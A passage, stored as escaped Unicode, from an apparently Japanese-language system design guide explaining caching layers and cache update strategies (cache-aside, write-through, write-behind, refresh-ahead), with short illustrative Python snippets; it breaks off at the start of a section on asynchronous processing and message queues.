web\u30b5\u30fc\u30d0\u30fc\u3082\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u30ad\u30e3\u30c3\u30b7\u30e5\u3057\u3066\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30b5\u30fc\u30d0\u30fc\u306b\u63a5\u7d9a\u3059\u308b\u3053\u3068\u306a\u3057\u306b\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u8fd4\u3059\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n### \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\n\n\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306f\u666e\u901a\u3001\u4e00\u822c\u7684\u306a\u4f7f\u7528\u72b6\u6cc1\u306b\u9069\u3059\u308b\u3088\u3046\u306a\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\u306e\u8a2d\u5b9a\u3092\u521d\u671f\u72b6\u614b\u3067\u6301\u3063\u3066\u3044\u307e\u3059\u3002\u3053\u306e\u8a2d\u5b9a\u3092\u7279\u5b9a\u306e\u4ed5\u69d8\u306b\u5408\u308f\u305b\u3066\u8abf\u6574\u3059\u308b\u3053\u3068\u3067\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u3092\u5411\u4e0a\u3055\u305b\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n### \u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\n\n\u30e1\u30e0\u30ad\u30e3\u30c3\u30b7\u30e5\u306a\u3069\u306eIn-memory\u30ad\u30e3\u30c3\u30b7\u30e5\u3084Redis\u306f\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3068\u30c7\u30fc\u30bf\u30b9\u30c8\u30ec\u30fc\u30b8\u306e\u9593\u306e\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\u3067\u3059\u3002\u30c7\u30fc\u30bf\u306fRAM\u3067\u4fdd\u6301\u3055\u308c\u308b\u305f\u3081\u3001\u30c7\u30fc\u30bf\u304c\u30c7\u30a3\u30b9\u30af\u3067\u4fdd\u5b58\u3055\u308c\u308b\u4e00\u822c\u7684\u306a\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3088\u308a\u3082\u3060\u3044\u3076\u901f\u3044\u3067\u3059\u3002RAM\u5bb9\u91cf\u306f\u30c7\u30a3\u30b9\u30af\u3088\u308a\u3082\u9650\u3089\u308c\u3066\u3044\u308b\u306e\u3067\u3001[least recently used (LRU)](https:\/\/en.wikipedia.org\/wiki\/Cache_algorithms#Least_Recently_Used)\u306a\u3069\u306e[cache invalidation](https:\/\/en.wikipedia.org\/wiki\/Cache_algorithms) \u30a2\u30eb\u30b4\u30ea\u30ba\u30e0\u304c '\u30b3\u30fc\u30eb\u30c9' \u306a\u30a8\u30f3\u30c8\u30ea\u3092\u5f3e\u304d\u3001'\u30db\u30c3\u30c8' \u306a\u30c7\u30fc\u30bf\u3092RAM\u306b\u4fdd\u5b58\u3057\u307e\u3059\u3002\n\nRedis\u306f\u3055\u3089\u306b\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u6a5f\u80fd\u3092\u5099\u3048\u3066\u3044\u307e\u3059:\n\n* \u30d1\u30fc\u30b8\u30b9\u30c6\u30f3\u30b9\u8a2d\u5b9a\n* \u30bd\u30fc\u30c8\u6e08\u307f\u30bb\u30c3\u30c8\u3001\u30ea\u30b9\u30c8\u306a\u3069\u306e\u7d44\u307f\u8fbc\u307f\u30c7\u30fc\u30bf\u69cb\u9020\n\n\u30ad\u30e3\u30c3\u30b7\u30e5\u306b\u306f\u69d8\u3005\u306a\u30ec\u30d9\u30eb\u306e\u3082\u306e\u304c\u3042\u308a\u307e\u3059\u304c\u3001\u3044\u305a\u308c\u3082\u5927\u304d\u304f\u4e8c\u3064\u306e\u30ab\u30c6\u30b4\u30ea\u30fc\u306e\u3044\u305a\u308c\u304b\u306b\u5206\u985e\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059: **\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30af\u30a8\u30ea** \u3068 **\u30aa\u30d6\u30b8\u30a7\u30af\u30c8** \u3067\u3059:\n\n* \u884c\u30ec\u30d9\u30eb\n* \u30af\u30a8\u30ea\u30ec\u30d9\u30eb\n* Fully-formed serializable objects\n* Fully-rendered HTML\n\n\u4e00\u822c\u7684\u306b\u3001\u30d5\u30a1\u30a4\u30eb\u30d9\u30fc\u30b9\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\u306f\u30af\u30ed\u30fc\u30f3\u3092\u4f5c\u308a\u51fa\u3057\u3066\u30aa\u30fc\u30c8\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u3092\u96e3\u3057\u304f\u3057\u3066\u3057\u307e\u3046\u306e\u3067\u907f\u3051\u308b\u3079\u304d\u3067\u3059\u3002\n\n### \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30af\u30a8\u30ea\u30ec\u30d9\u30eb\u3067\u306e\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\n\n\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3092\u30af\u30a8\u30ea\u3059\u308b\u969b\u306b\u306f\u5fc5\u305a\u30af\u30a8\u30ea\u3092\u30ad\u30fc\u3068\u3057\u3066\u30cf\u30c3\u30b7\u30e5\u3057\u3066\u7d50\u679c\u3092\u30ad\u30e3\u30c3\u30b7\u30e5\u306b\u4fdd\u5b58\u3057\u307e\u3057\u3087\u3046\u3002\u3053\u306e\u624b\u6cd5\u306f\u30ad\u30e3\u30c3\u30b7\u30e5\u671f\u9650\u5207\u308c\u554f\u984c\u306b\u60a9\u3080\u3053\u3068\u306b\u306a\u308a\u307e\u3059:\n\n* \u8907\u96d1\u306a\u30af\u30a8\u30ea\u306b\u3088\u308a\u30ad\u30e3\u30c3\u30b7\u30e5\u3055\u308c\u305f\u7d50\u679c\u3092\u524a\u9664\u3059\u308b\u3053\u3068\u304c\u56f0\u96e3\n* \u30c6\u30fc\u30d6\u30eb\u30bb\u30eb\u306a\u3069\u306e\u30c7\u30fc\u30bf\u65ad\u7247\u304c\u5909\u5316\u3057\u305f\u6642\u306b\u3001\u305d\u306e\u5909\u5316\u3057\u305f\u30bb\u30eb\u3092\u542b\u3080\u304b\u3082\u3057\u308c\u306a\u3044\u5168\u3066\u306e\u30ad\u30e3\u30c3\u30b7\u30e5\u3055\u308c\u305f\u30af\u30a8\u30ea\u3092\u524a\u9664\u3059\u308b\u5fc5\u8981\u304c\u3042\u308b\u3002\n\n### \u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u30ec\u30d9\u30eb\u3067\u306e\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\n\n\u30c7\u30fc\u30bf\u3092\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30b3\u30fc\u30c9\u3067\u305d\u3046\u3059\u308b\u3088\u3046\u306b\u3001\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u3068\u3057\u3066\u6349\u3048\u3066\u307f\u307e\u3057\u3087\u3046\u3002\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306b\u3001\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u304b\u3089\u306e\u30c7\u30fc\u30bf\u30bb\u30c3\u30c8\u3092\u30af\u30e9\u30b9\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u3084\u30c7\u30fc\u30bf\u69cb\u9020\u3068\u3057\u3066\u7d44\u307f\u7acb\u3066\u3055\u305b\u307e\u3059\u3002:\n\n* \u305d\u306e\u30c7\u30fc\u30bf\u304c\u5909\u66f4\u3055\u308c\u305f\u3089\u3001\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u3092\u30ad\u30e3\u30c3\u30b7\u30e5\u304b\u3089\u524a\u9664\u3059\u308b\u3053\u3068\n* \u975e\u540c\u671f\u51e6\u7406\u3092\u8a31\u5bb9\u3057\u307e\u3059: \u30ef\u30fc\u30ab\u30fc\u304c\u30ad\u30e3\u30c3\u30b7\u30e5\u3055\u308c\u305f\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u306e\u4e2d\u3067\u6700\u65b0\u306e\u3082\u306e\u3092\u96c6\u3081\u3066\u304d\u307e\u3059\n\n\u4f55\u3092\u30ad\u30e3\u30c3\u30b7\u30e5\u3059\u308b\u304b:\n\n* \u30e6\u30fc\u30b6\u30fc\u306e\u30bb\u30c3\u30b7\u30e7\u30f3\n* \u5b8c\u5168\u306b\u30ec\u30f3\u30c0\u30fc\u3055\u308c\u305f\u30a6\u30a7\u30d6\u30da\u30fc\u30b8\n* \u30a2\u30af\u30c6\u30d3\u30c6\u30a3\u30b9\u30c8\u30ea\u30fc\u30e0\n* \u30e6\u30fc\u30b6\u30fc\u30b0\u30e9\u30d5\u30c7\u30fc\u30bf\n\n### \u3044\u3064\u30ad\u30e3\u30c3\u30b7\u30e5\u3092\u66f4\u65b0\u3059\u308b\u304b\n\n\u30ad\u30e3\u30c3\u30b7\u30e5\u306b\u4fdd\u5b58\u3067\u304d\u308b\u5bb9\u91cf\u306f\u9650\u3089\u308c\u3066\u3044\u308b\u305f\u3081\u3001\u81ea\u5206\u306e\u30b1\u30fc\u30b9\u3067\u306f\u3069\u306e\u30ad\u30e3\u30c3\u30b7\u30e5\u624b\u6cd5\u304c\u4e00\u756a\u3044\u3044\u304b\u306f\u691c\u8a0e\u3059\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n\n#### \u30ad\u30e3\u30c3\u30b7\u30e5\u30a2\u30b5\u30a4\u30c9\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/ONjORqk.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.slideshare.net\/tmatyashovsky\/from-cache-to-in-memory-data-grid-introduction-to-hazelcast>Source: From cache to in-memory data grid<\/a><\/i>\n<\/p>\n\n\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306f\u30b9\u30c8\u30ec\u30fc\u30b8\u3078\u306e\u8aad\u307f\u66f8\u304d\u306e\u51e6\u7406\u3092\u3057\u307e\u3059\u3002\u30ad\u30e3\u30c3\u30b7\u30e5\u306f\u30b9\u30c8\u30ec\u30fc\u30b8\u3068\u306f\u76f4\u63a5\u3084\u308a\u3068\u308a\u3092\u3057\u307e\u305b\u3093\u3002\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306f\u4ee5\u4e0b\u306e\u3053\u3068\u3092\u3057\u307e\u3059:\n\n* \u30ad\u30e3\u30c3\u30b7\u30e5\u306e\u4e2d\u306e\u30a8\u30f3\u30c8\u30ea\u3092\u53c2\u7167\u3057\u307e\u3059\u304c\u3001\u7d50\u679c\u3068\u3057\u3066\u30ad\u30e3\u30c3\u30b7\u30e5\u30df\u30b9\u306b\u306a\u308a\u307e\u3059\n* \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u304b\u3089\u30a8\u30f3\u30c8\u30ea\u3092\u53d6\u5f97\u3057\u307e\u3059\n* \u30a8\u30f3\u30c8\u30ea\u3092\u30ad\u30e3\u30c3\u30b7\u30e5\u306b\u8ffd\u52a0\u3057\u307e\u3059\n* \u30a8\u30f3\u30c8\u30ea\u3092\u8fd4\u3057\u307e\u3059\n\n```python\ndef get_user(self, user_id):\n    user = cache.get(\"user.{0}\", user_id)\n    if user is None:\n        user = db.query(\"SELECT * FROM users WHERE user_id = {0}\", user_id)\n        if user is not None:\n            key = \"user.{0}\".format(user_id)\n            cache.set(key, json.dumps(user))\n    return user\n```\n\n[Memcached](https:\/\/memcached.org\/) \u306f\u901a\u5e38\u3053\u306e\u3088\u3046\u306b\u4f7f\u308f\u308c\u308b\u3002\n\n\u305d\u306e\u5f8c\u306e\u30ad\u30e3\u30c3\u30b7\u30e5\u30c7\u30fc\u30bf\u8aad\u307f\u8fbc\u307f\u306f\u901f\u3044\u3067\u3059\u3002\u30ad\u30e3\u30c3\u30b7\u30e5\u30a2\u30b5\u30a4\u30c9\u306f\u30ec\u30fc\u30b8\u30fc\u30ed\u30fc\u30c7\u30a3\u30f3\u30b0\u3067\u3042\u308b\u3068\u3082\u8a00\u308f\u308c\u307e\u3059\u3002\u30ea\u30af\u30a8\u30b9\u30c8\u3055\u308c\u305f\u30c7\u30fc\u30bf\u306e\u307f\u304c\u30ad\u30e3\u30c3\u30b7\u30e5\u3055\u308c\u3001\u30ea\u30af\u30a8\u30b9\u30c8\u3055\u308c\u3066\u3044\u306a\u3044\u30c7\u30fc\u30bf\u3067\u30ad\u30e3\u30c3\u30b7\u30e5\u304c\u6ea2\u308c\u308b\u306e\u3092\u9632\u6b62\u3057\u307e\u3059\u3002\n\n##### \u6b20\u70b9: \u30ad\u30e3\u30c3\u30b7\u30e5\u30a2\u30b5\u30a4\u30c9\n\n* \u5404\u30ad\u30e3\u30c3\u30b7\u30e5\u30df\u30b9\u306f\u4e09\u3064\u306e\u30c8\u30ea\u30c3\u30d7\u3092\u547c\u3073\u51fa\u3059\u3053\u3068\u306b\u306a\u308a\u3001\u4f53\u611f\u3067\u304d\u308b\u307b\u3069\u306e\u9045\u5ef6\u304c\u8d77\u304d\u3066\u3057\u307e\u3044\u307e\u3059\u3002\n* \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u30c7\u30fc\u30bf\u304c\u66f4\u65b0\u3055\u308c\u308b\u3068\u30ad\u30e3\u30c3\u30b7\u30e5\u30c7\u30fc\u30bf\u306f\u53e4\u3044\u3082\u306e\u306b\u306a\u3063\u3066\u3057\u307e\u3044\u307e\u3059\u3002time-to-live (TTL)\u3092\u8a2d\u5b9a\u3059\u308b\u3053\u3068\u3067\u30ad\u30e3\u30c3\u30b7\u30e5\u30a8\u30f3\u30c8\u30ea\u306e\u66f4\u65b0\u3092\u5f37\u5236\u7684\u306b\u884c\u3046\u3001\u3082\u3057\u304f\u306f\u30e9\u30a4\u30c8\u30b9\u30eb\u30fc\u3092\u63a1\u7528\u3059\u308b\u3053\u3068\u3067\u3053\u306e\u554f\u984c\u306f\u7de9\u548c\u3067\u304d\u307e\u3059\u3002\n* \u30ce\u30fc\u30c9\u304c\u843d\u3061\u308b\u3068\u3001\u65b0\u898f\u306e\u7a7a\u306e\u30ce\u30fc\u30c9\u3067\u4ee3\u66ff\u3055\u308c\u308b\u3053\u3068\u3067\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u304c\u5897\u52a0\u3059\u308b\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n\n#### \u30e9\u30a4\u30c8\u30b9\u30eb\u30fc\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/0vBc0hN.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.slideshare.net\/jboner\/scalability-availability-stability-patterns\/>Source: Scalability, availability, stability, patterns<\/a><\/i>\n<\/p>\n\n\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306f\u30ad\u30e3\u30c3\u30b7\u30e5\u3092\u30e1\u30a4\u30f3\u306e\u30c7\u30fc\u30bf\u30b9\u30c8\u30a2\u3068\u3057\u3066\u4f7f\u3044\u3001\u305d\u3053\u306b\u30c7\u30fc\u30bf\u306e\u8aad\u307f\u66f8\u304d\u3092\u884c\u3044\u307e\u3059\u3002\u4e00\u65b9\u3001\u30ad\u30e3\u30c3\u30b7\u30e5\u306f\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3078\u306e\u8aad\u307f\u66f8\u304d\u3092\u62c5\u5f53\u3057\u307e\u3059\u3002\n\n* \u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306f\u30ad\u30e3\u30c3\u30b7\u30e5\u306b\u3042\u308b\u30a8\u30f3\u30c8\u30ea\u3092\u8ffd\u52a0\u30fb\u66f4\u65b0\u3057\u307e\u3059\n* \u30ad\u30e3\u30c3\u30b7\u30e5\u306f\u540c\u671f\u7684\u306b\u30c7\u30fc\u30bf\u30b9\u30c8\u30a2\u306b\u66f8\u304d\u8fbc\u307f\u3092\u884c\u3044\u307e\u3059\n* \u30a8\u30f3\u30c8\u30ea\u3092\u8fd4\u3057\u307e\u3059\n\n\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30b3\u30fc\u30c9:\n\n```\nset_user(12345, {\"foo\":\"bar\"})\n```\n\n\u30ad\u30e3\u30c3\u30b7\u30e5\u30b3\u30fc\u30c9:\n\n```python\ndef set_user(user_id, values):\n    user = db.query(\"UPDATE Users WHERE id = {0}\", user_id, values)\n    cache.set(user_id, user)\n```\n\n\u30e9\u30a4\u30c8\u30b9\u30eb\u30fc\u306f\u66f8\u304d\u8fbc\u307f\u51e6\u7406\u306e\u305b\u3044\u3067\u5168\u4f53\u3068\u3057\u3066\u306f\u9045\u3044\u30aa\u30da\u30ec\u30fc\u30b7\u30e7\u30f3\u3067\u3059\u304c\u3001\u66f8\u304d\u8fbc\u307e\u308c\u305f\u3070\u304b\u308a\u306e\u30c7\u30fc\u30bf\u306b\u95a2\u3059\u308b\u8aad\u307f\u8fbc\u307f\u306f\u901f\u3044\u3067\u3059\u3002\u30e6\u30fc\u30b6\u30fc\u5074\u306f\u4e00\u822c\u7684\u306b\u30c7\u30fc\u30bf\u66f4\u65b0\u6642\u306e\u65b9\u304c\u8aad\u307f\u8fbc\u307f\u6642\u3088\u308a\u3082\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u306b\u8a31\u5bb9\u7684\u3067\u3059\u3002\u30ad\u30e3\u30c3\u30b7\u30e5\u5185\u306e\u30c7\u30fc\u30bf\u306f\u6700\u65b0\u7248\u3067\u4fdd\u305f\u308c\u307e\u3059\u3002\n\n##### \u6b20\u70b9: \u30e9\u30a4\u30c8\u30b9\u30eb\u30fc\n\n* \u30ce\u30fc\u30c9\u304c\u843d\u3061\u305f\u3053\u3068\u3001\u3082\u3057\u304f\u306f\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u306b\u3088\u3063\u3066\u65b0\u3057\u3044\u30ce\u30fc\u30c9\u304c\u4f5c\u6210\u3055\u308c\u305f\u6642\u306b\u3001\u65b0\u3057\u3044\u30ce\u30fc\u30c9\u306f\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u5185\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u304c\u66f4\u65b0\u3055\u308c\u308b\u307e\u3067\u306f\u30a8\u30f3\u30c8\u30ea\u30fc\u3092\u30ad\u30e3\u30c3\u30b7\u30e5\u3057\u307e\u305b\u3093\u3002\u30ad\u30e3\u30c3\u30b7\u30e5\u30a2\u30b5\u30a4\u30c9\u3068\u30e9\u30a4\u30c8\u30b9\u30eb\u30fc\u3092\u4f75\u7528\u3059\u308b\u3053\u3068\u3067\u3053\u306e\u554f\u984c\u3092\u7de9\u548c\u3067\u304d\u307e\u3059\u3002\n* \u66f8\u304d\u8fbc\u307e\u308c\u305f\u30c7\u30fc\u30bf\u306e\u5927\u90e8\u5206\u306f\u4e00\u5ea6\u3082\u8aad\u307f\u8fbc\u307e\u308c\u308b\u3053\u3068\u306f\u3042\u308a\u307e\u305b\u3093\u3002\u3053\u306e\u30c7\u30fc\u30bf\u306fTTL\u306b\u3088\u3063\u3066\u5727\u7e2e\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n#### \u30e9\u30a4\u30c8\u30d3\u30cf\u30a4\u30f3\u30c9 (\u30e9\u30a4\u30c8\u30d0\u30c3\u30af)\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/rgSrvjG.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.slideshare.net\/jboner\/scalability-availability-stability-patterns\/>Source: Scalability, availability, stability, patterns<\/a><\/i>\n<\/p>\n\n\u30e9\u30a4\u30c8\u30d3\u30cf\u30a4\u30f3\u30c9\u3067\u306f\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306f\u4ee5\u4e0b\u306e\u3053\u3068\u3092\u3057\u307e\u3059:\n\n* \u30ad\u30e3\u30c3\u30b7\u30e5\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u3092\u8ffd\u52a0\u30fb\u66f4\u65b0\u3057\u307e\u3059\n* \u30c7\u30fc\u30bf\u30b9\u30c8\u30a2\u3078\u306e\u66f8\u304d\u8fbc\u307f\u3092\u975e\u540c\u671f\u7684\u306b\u884c\u3046\u3053\u3068\u3067\u3001\u66f8\u304d\u8fbc\u307f\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u3092\u5411\u4e0a\u3055\u305b\u307e\u3059\u3002\n\n##### \u6b20\u70b9: \u30e9\u30a4\u30c8\u30d3\u30cf\u30a4\u30f3\u30c9\n\n* \u30ad\u30e3\u30c3\u30b7\u30e5\u304c\u30c7\u30fc\u30bf\u30b9\u30c8\u30a2\u5185\u306e\u30b3\u30f3\u30c6\u30f3\u30c4\u306b\u30d2\u30c3\u30c8\u3059\u308b\u524d\u306b\u30ad\u30e3\u30c3\u30b7\u30e5\u304c\u843d\u3061\u308b\u3068\u30c7\u30fc\u30bf\u6b20\u640d\u304c\u8d77\u304d\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n* \u30ad\u30e3\u30c3\u30b7\u30e5\u30a2\u30b5\u30a4\u30c9\u3084\u30e9\u30a4\u30c8\u30b9\u30eb\u30fc\u3088\u308a\u3082\u5b9f\u88c5\u304c\u8907\u96d1\u306b\u306a\u308a\u307e\u3059\u3002\n\n#### \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30a2\u30d8\u30c3\u30c9\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/kxtjqgE.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.slideshare.net\/tmatyashovsky\/from-cache-to-in-memory-data-grid-introduction-to-hazelcast>Source: From cache to in-memory data grid<\/a><\/i>\n<\/p>\n\n\u671f\u9650\u5207\u308c\u3088\u308a\u3082\u524d\u306b\u3001\u76f4\u8fd1\u3067\u30a2\u30af\u30bb\u30b9\u3055\u308c\u305f\u5168\u3066\u306e\u30ad\u30e3\u30c3\u30b7\u30e5\u30a8\u30f3\u30c8\u30ea\u3092\u81ea\u52d5\u7684\u306b\u66f4\u65b0\u3059\u308b\u3088\u3046\u306b\u8a2d\u5b9a\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n\u3082\u3057\u3069\u306e\u30a2\u30a4\u30c6\u30e0\u304c\u5c06\u6765\u5fc5\u8981\u306b\u306a\u308b\u306e\u304b\u3092\u6b63\u78ba\u306b\u4e88\u6e2c\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u306e\u306a\u3089\u3070\u3001\u30ea\u30fc\u30c9\u30b9\u30eb\u30fc\u3088\u308a\u3082\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u3092\u524a\u6e1b\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n##### \u6b20\u70b9: \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30a2\u30d8\u30c3\u30c9\n\n* \u3069\u306e\u30a2\u30a4\u30c6\u30e0\u304c\u5fc5\u8981\u306b\u306a\u308b\u304b\u306e\u4e88\u6e2c\u304c\u6b63\u78ba\u3067\u306a\u3044\u5834\u5408\u306b\u306f\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30a2\u30d8\u30c3\u30c9\u304c\u306a\u3044\u65b9\u304c\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u306f\u826f\u3044\u3068\u3044\u3046\u7d50\u679c\u306b\u306a\u3063\u3066\u3057\u307e\u3044\u307e\u3059\u3002\n\n### \u6b20\u70b9: \u30ad\u30e3\u30c3\u30b7\u30e5\n\n* [cache invalidation](https:\/\/en.wikipedia.org\/wiki\/Cache_algorithms)\u306a\u3069\u3092\u7528\u3044\u3066\u3001\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306a\u3069\u306e\u771f\u306e\u30c7\u30fc\u30bf\u3068\u30ad\u30e3\u30c3\u30b7\u30e5\u306e\u9593\u306e\u4e00\u8cab\u6027\u3092\u4fdd\u3064\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n* Redis\u3084memcached\u3092\u8ffd\u52a0\u3059\u308b\u3053\u3068\u3067\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u69cb\u6210\u3092\u5909\u66f4\u3059\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n* Cache invalidation\u3082\u96e3\u3057\u3044\u3067\u3059\u304c\u305d\u308c\u306b\u52a0\u3048\u3066\u3001\u3044\u3064\u30ad\u30e3\u30c3\u30b7\u30e5\u3092\u66f4\u65b0\u3059\u308b\u304b\u3068\u3044\u3046\u8907\u96d1\u306a\u554f\u984c\u306b\u3082\u60a9\u307e\u3055\u308c\u308b\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [From cache to in-memory data grid](http:\/\/www.slideshare.net\/tmatyashovsky\/from-cache-to-in-memory-data-grid-introduction-to-hazelcast)\n* [\u30b9\u30b1\u30fc\u30e9\u30d6\u30eb\u306a\u30b7\u30b9\u30c6\u30e0\u30c7\u30b6\u30a4\u30f3\u30d1\u30bf\u30fc\u30f3](http:\/\/horicky.blogspot.com\/2010\/10\/scalable-system-design-patterns.html)\n* [\u30b9\u30b1\u30fc\u30eb\u3067\u304d\u308b\u30b7\u30b9\u30c6\u30e0\u3092\u8a2d\u8a08\u3059\u308b\u305f\u3081\u306e\u30a4\u30f3\u30c8\u30ed\u30c0\u30af\u30b7\u30e7\u30f3](http:\/\/lethain.com\/introduction-to-architecting-systems-for-scale\/)\n* [\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u3001\u53ef\u7528\u6027\u3001\u5b89\u5b9a\u6027\u3001\u30d1\u30bf\u30fc\u30f3](http:\/\/www.slideshare.net\/jboner\/scalability-availability-stability-patterns\/)\n* [\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3](http:\/\/www.lecloud.net\/post\/9246290032\/scalability-for-dummies-part-3-cache)\n* [AWS ElastiCache\u306e\u30b9\u30c8\u30e9\u30c6\u30b8\u30fc](http:\/\/docs.aws.amazon.com\/AmazonElastiCache\/latest\/UserGuide\/Strategies.html)\n* [Wikipedia](https:\/\/en.wikipedia.org\/wiki\/Cache_(computing))\n\n## \u975e\u540c\u671f\u51e6\u7406\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/54GYsSx.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/lethain.com\/introduction-to-architecting-systems-for-scale\/#platform_layer>Source: Intro to architecting systems for scale<\/a><\/i>\n<\/p>\n\n\u975e\u540c\u671f\u306e\u30ef\u30fc\u30af\u30d5\u30ed\u30fc\u306f\u3082\u3057\u3001\u9023\u7d9a\u7684\u306b\u884c\u308f\u308c\u308b\u3068\u30ea\u30af\u30a8\u30b9\u30c8\u6642\u9593\u3092\u5727\u8feb\u3057\u3066\u3057\u307e\u3046\u3088\u3046\u306a\u91cd\u3044\u51e6\u7406\u3092\u5225\u3067\u51e6\u7406\u3059\u308b\u624b\u6cd5\u3067\u3059\u3002\u307e\u305f\u3001\u5b9a\u671f\u7684\u306b\u30c7\u30fc\u30bf\u3092\u96c6\u5408\u3055\u305b\u308b\u306a\u3069\u306e\u6642\u9593\u304c\u304b\u304b\u308b\u3088\u3046\u306a\u51e6\u7406\u3092\u524d\u3082\u3063\u3066\u51e6\u7406\u3057\u3066\u304a\u304f\u3053\u3068\u306b\u3082\u5f79\u7acb\u3061\u307e\u3059\u3002\n\n### \u30e1\u30c3\u30bb\u30fc\u30b8\u30ad\u30e5\u30fc\n\n\u30e1\u30c3\u30bb\u30fc\u30b8\u30ad\u30e5\u30fc\u306f\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u53d7\u3051\u53d6\u308a\u3001\u4fdd\u5b58\u3057\u3001\u914d\u4fe1\u3057\u307e\u3059\u3002\u3082\u3057\u3001\u51e6\u7406\u304c\u30a4\u30f3\u30e9\u30a4\u30f3\u3067\u884c\u3046\u306b\u306f\u9045\u3059\u304e\u308b\u5834\u5408\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u30ef\u30fc\u30af\u30d5\u30ed\u30fc\u3067\u30e1\u30c3\u30bb\u30fc\u30b8\u30ad\u30e5\u30fc\u3092\u7528\u3044\u308b\u3068\u3044\u3044\u3067\u3057\u3087\u3046:\n\n* \u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306f\u30b8\u30e7\u30d6\u3092\u30ad\u30e5\u30fc\u306b\u914d\u4fe1\u3057\u3001\u30e6\u30fc\u30b6\u30fc\u306b\u30b8\u30e7\u30d6\u30b9\u30c6\u30fc\u30bf\u30b9\u3092\u4f1d\u3048\u307e\u3059\u3002\n* 